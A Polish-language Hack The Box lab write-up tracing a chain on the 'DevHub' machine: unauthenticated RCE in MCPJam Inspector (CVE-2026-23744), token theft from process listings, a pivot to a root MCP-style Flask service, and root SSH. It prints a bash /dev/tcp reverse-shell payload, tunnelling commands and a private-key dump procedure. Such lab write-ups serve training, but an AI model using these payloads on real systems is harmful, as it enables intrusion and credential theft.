# DevHub — Linux (MCP / Jupyter)

Własny zapis łańcucha (lab HTB). **Bez flag.** Prywatnego klucza roota nie commituj.

```
MCPJam Inspector :6274 (CVE-2026-23744)
  → RCE as mcp-dev
  → Jupyter analyst token in ps / jupyter.service
  → OpsMCP Flask as root on 127.0.0.1:5000
  → ops._admin_dump target=ssh_keys
  → SSH root (id_rsa)
```

Alt privesc (nieużyty): PackageKit **1.2.5** → [CVE-2026-41651 Pack2TheRoot](https://github.security.telekom.com/2026/04/pack2theroot-linux-local-privilege-escalation.html).

---

## TL;DR

| Faza | Wektor | User |
|------|--------|------|
| Recon | nginx `:80` reklamuje MCP `:6274` i Jupyter `localhost:8888` | — |
| Foothold | MCPJam **CVE-2026-23744** `POST /api/mcp/connect` | `mcp-dev` |
| User | Jupyter token z `ps aux` / `jupyter.service` | `analyst` |
| Root | OpsMCP `ops._admin_dump` → `/root/.ssh/id_rsa` | **root** |

---

## 1. Recon

```bash
echo '<IP> devhub.htb' | sudo tee -a /etc/hosts
nmap -sC -sV -p 22,80,6274 <IP>
```

Otwarte z zewnątrz: **22** (OpenSSH 8.9p1 Ubuntu), **80** (nginx 1.18.0), **6274** (MCPJam Inspector).  
Filtrowane: `5000`, `8888`, `2222` — żyją tylko na loopbacku.

Port 80 to landing „Internal Development & Analytics Platform”:

- **MCP Inspector** — Active, port **6274**
- **Analytics Dashboard** — Jupyter, **Internal Only — localhost:8888**
- Code repo — maintenance (dead)

`:6274` serwuje `title: MCPJam Inspector` (`/mcp_jam.svg`).

---

## 2. Foothold — CVE-2026-23744

MCPJam Inspector **≤ 1.4.2** (fix 1.4.3). Domyślnie bind **`0.0.0.0`**, nie localhost.

Brak auth na `POST /api/mcp/connect`. Body steruje spawnem procesu MCP servera (`command` + `args`) → klasyczne CWE-306, CVSS 9.8.

```json
{
  "serverConfig": {
    "command": "bash",
    "args": ["-c", "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"],
    "env": {}
  },
  "serverId": "x"
}
```

PoC: [`scripts/cve_2026_23744.py`](scripts/cve_2026_23744.py)

```bash
nc -lvnp 4444
python3 scripts/cve_2026_23744.py --url http://devhub.htb:6274 --lhost <tun0> --lport 4444
```

Shell: **`mcp-dev`**. Stabilizacja: klucz w `~/.ssh/authorized_keys` albo **chisel reverse** (Jupyter `:8888` + sshd hosta jako `:2222`).

```bash
# Kali
chisel server -p 8001 --reverse
# target (mcp-dev)
./chisel client <tun0>:8001 R:8888:127.0.0.1:8888 R:2222:127.0.0.1:22
```

---

## 3. User — Jupyter `analyst`

```bash
ps aux | grep -E 'jupyter|opsmcp|analyst'
```

Kluczowe procesy:

- `analyst` — `jupyter-lab --ip=127.0.0.1 --port=8888 --ServerApp.token=<hex> --ServerApp.password=`
- `root` — `/home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py`

Token jest też w `jupyter.service` `ExecStart` (linpeas: writable PATH `jupyter-env/bin` — ślepy zaułek; `flask` w venv jest `root:root`, reszta `analyst`).

Po tunelu:

```text
http://127.0.0.1:8888/lab?token=<z ps>
```

REST API przyjmuje `Authorization: token <token>` (login form ma XSRF — omijać hederem). Kernel Python = shell `analyst`. User flag: `/home/analyst/user.txt`.

`--ServerApp.disable_check_xsrf=False` — sam POST `/login` bez `_xsrf` pada 403. Token w query/`Authorization` wystarcza.

---

## 4. Root — OpsMCP `ops._admin_dump`

`/opt/opsmcp/server.py` — Flask, **root**, bind `127.0.0.1:5000`. Auth: header `X-API-Key` (hardcoded w pliku, `VALID_API_KEY`).

Endpointy: `/health`, `/tools/list`, `/tools/call`. Ukryty tool:

```python
elif tool_name == "ops._admin_dump":
    # confirm=true, target == "ssh_keys"
    with open("/root/.ssh/id_rsa", "r") as f:
        return jsonify({"root_private_key": f.read(), ...})
```

Z Kali **nie** dosięgniesz `:5000` bez pivotu. Dwa sposoby:

**A.** SSH local-forward jako `analyst` / `mcp-dev`:

```bash
ssh -i <key> analyst@devhub.htb -L 5000:127.0.0.1:5000
curl -s http://127.0.0.1:5000/
# {"server":"OPSMCP","version":"2.1.0",...}
```

**B.** Bez SSH — kernel Jupyter (już na `127.0.0.1`): [`scripts/opsmcp_dump_via_jupyter.py`](scripts/opsmcp_dump_via_jupyter.py)

```bash
python3 scripts/opsmcp_dump_via_jupyter.py \
  --jupyter http://127.0.0.1:8888 \
  --token <jupyter-token> \
  --api-key <z /opt/opsmcp/server.py> \
  -o dump.json
python3 scripts/json_unescape_key.py dump.json root_id_rsa
chmod 600 root_id_rsa
ssh-keygen -l -f root_id_rsa   # MUSI wypisać fingerprint, nie "not a key file"
ssh -i root_id_rsa -o IdentitiesOnly=yes root@devhub.htb
# albo przez chisel: -p 2222 root@127.0.0.1
```

Klucz to **OpenSSH RSA** (`root@devhub`), nie PEM PKCS#1. Hostowy sshd 8.9 przyjmuje `rsa-sha2-256` — `-o PubkeyAcceptedKeyTypes=+ssh-rsa` jest zbędne.

---

## 5. Pułapka: dump JSON ≠ plik klucza

`curl …/tools/call` zwraca JSON. Pole `root_private_key` ma **escapowane** `\n` (dwa znaki). Wklejenie 1:1 do pliku:

```text
-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAA...
```

`file` kłamie „OpenSSH private key” (widzi nagłówek). `ssh-keygen -l` mówi prawdę: `is not a key file`.

Prawie-naprawa:

```bash
printf "$(sed 's/\\n/\n/g' /tmp/root_key)" > /tmp/root_key_fixed
```

`$(…)` w bash/zsh **obcina trailing newline**. OpenSSH **wymaga** `\n` po linii `-----END OPENSSH PRIVATE KEY-----`. Różnica: **1 bajt**. `ssh-keygen` dalej: `not a key file`.

Fix:

```python
# json_unescape_key.py — json.load + trailing newline
```

albo po `sed`: `echo >> plik`. Sprawdzaj zawsze `ssh-keygen -l` zanim pójdziesz w `ssh-keygen -t ed25519` i `authorized_keys` na złym hoście.

---

## Notatki

- `mcp-dev` (1001), `analyst` (1002), `root`.
- `jupyter-env/bin` writable jako analyst — `opsmcp.service` ma ten PATH, ale `flask` jest root:root; PATH hijack nie był potrzebny.
- OpsMCP nie ma reverse proxy z `:80`. Same `localhost:5000`.
- Nie commituj `user.txt` / `root.txt` / `id_rsa`.
